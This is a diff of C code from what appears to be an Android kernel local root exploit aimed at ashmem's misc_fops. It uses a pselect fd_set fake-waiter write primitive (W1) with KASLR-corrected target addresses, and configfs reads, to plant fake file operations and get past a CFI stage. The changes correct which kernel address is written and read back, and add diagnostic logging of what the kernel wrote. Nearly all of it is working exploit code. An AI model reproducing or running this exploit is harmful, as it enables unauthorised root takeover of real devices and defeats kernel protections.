@@ -204,10 +204,11 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(ex);
 
   int words_per_set = pselect_words_per_set();
-  /* W1 写目标必须是【运行时】misc_fops 槽地址: canon_addr = kaslr_base +
-   * image 偏移。data_addr/p0_data_alias 是 slide=0 的编译期 linear map
-   * 别名 —— 本机 slide 高达 0x10b6800000(68GB 级), 别名指向无辜物理页,
-   * W1 写它不 panic 但 misc_fops 槽永远改不成(root 失败且污染内存)。 */
+  /* W1 写目标(运行时 misc_fops 槽地址)用 canon_addr = kaslr_base + image 偏移。
+   * p0_data_alias 修正后, data_addr 也已正确别名到 misc_fops 所在物理页
+   * (与 canon_addr 指向同一页), 故读侧 try_cfi_stage 改用 data_addr 与写侧
+   * 同族。此处 fd_set 写目标保持 canon_addr(内核 walk 直接经此 VA 写),
+   * 二者现等价, 不再有"别名指向无辜物理页"问题。 */
   uint64_t misc_fops_target = canon_addr(ASHMEM_MISC_FOPS);
   uint64_t waiter_prio_word = ((uint64_t)FAKE_WAITER_PRIO << 32) | 3;
   if (fops_probe_depth == FOPS_DEPTH_EARLY_EXIT) {
@@ -353,6 +354,48 @@ void do_pselect_fake_lock_route(void) {
             n_first > 5 ? first_ready[5] : -1,
             n_first > 6 ? first_ready[6] : -1,
             n_first > 7 ? first_ready[7] : -1);
+
+    /* 诊断: 打印 fd_set diff, 看内核在 waiter 区域写回了什么
+     * 全链(depth=2) 下 tree_left (w2 / out[0]) 应该被写成 tree_pc
+     * —— 这就是 W1 写入的痕迹 */
+    if (fops_probe_depth == FOPS_DEPTH_FULL_CHAIN) {
+      fd_set in_pre, out_pre, ex_pre;
+      prepare_pselect_fdsets(&in_pre, &out_pre, &ex_pre);
+      int diff_count = 0;
+      uint64_t *in_post = (uint64_t *)&in;
+      uint64_t *in_pre_w = (uint64_t *)&in_pre;
+      uint64_t *out_post = (uint64_t *)&out;
+      uint64_t *out_pre_w = (uint64_t *)&out_pre;
+      uint64_t *ex_post = (uint64_t *)&ex;
+      uint64_t *ex_pre_w = (uint64_t *)&ex_pre;
+      int n_words = PSELECT_ROUTE_NFDS / (8 * sizeof(uint64_t));
+      for (int i = 0; i < n_words; i++) {
+        if (in_post[i] != in_pre_w[i]) {
+          pr_info("fops fdset DIFF in[%d] pre=%016llx post=%016llx\n",
+                  i, (unsigned long long)in_pre_w[i],
+                  (unsigned long long)in_post[i]);
+          diff_count++;
+        }
+      }
+      for (int i = 0; i < n_words; i++) {
+        if (out_post[i] != out_pre_w[i]) {
+          pr_info("fops fdset DIFF out[%d] pre=%016llx post=%016llx\n",
+                  i, (unsigned long long)out_pre_w[i],
+                  (unsigned long long)out_post[i]);
+          diff_count++;
+        }
+      }
+      for (int i = 0; i < n_words; i++) {
+        if (ex_post[i] != ex_pre_w[i]) {
+          pr_info("fops fdset DIFF ex[%d] pre=%016llx post=%016llx\n",
+                  i, (unsigned long long)ex_pre_w[i],
+                  (unsigned long long)ex_post[i]);
+          diff_count++;
+        }
+      }
+      pr_info("fops fdset diff total=%d (depth=%d)\n",
+              diff_count, fops_probe_depth);
+    }
 
     if (fops_probe_depth == FOPS_DEPTH_EARLY_EXIT) {
       /* DEPTH 0 探测轮: 早退路径零写零解引用,不可能弄脏 misc_fops,
@@ -541,9 +584,12 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  /* 运行时 misc_fops 槽地址(叠 KASLR slide);slide=0 的 data_addr 别名
-   * 指向无辜物理页,读它拿到的是垃圾 -> 必然 cfi_last_step=4。 */
-  uintptr_t misc_fops = canon_addr(ASHMEM_MISC_FOPS);
+  /* 读侧与写侧同族: W1 写目标经 data_addr(见 prepare_skb_payload 的
+   * write_right, 与 canon_addr 现已指向同一物理页), 这里也用 data_addr
+   * 读回同一页。p0_data_alias 修正后 data_addr 正确别名到 misc_fops 所在
+   * 物理页, 读到的即为 W1 写入的 fake_fops; 与上游(Poc-Analysis 已验证版)
+   * 完全一致。 */
+  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
@@ -551,6 +597,13 @@ int try_cfi_stage(void) {
     fops_before = pre_fops;
     cfi_last_step = 4;
     cfi_last_errno = errno;
+    pr_info("cfi step=4 (W1 miss) pre_rb=%zd pre_fops=%016llx "
+            "expected_fake_fops=%016llx misc_fops_addr=%016llx "
+            "canon_misc_fops=%016llx\n",
+            pre_rb, (unsigned long long)pre_fops,
+            (unsigned long long)fake_fops,
+            (unsigned long long)misc_fops,
+            (unsigned long long)canon_addr(ASHMEM_MISC_FOPS));
     goto fail;
   }
 
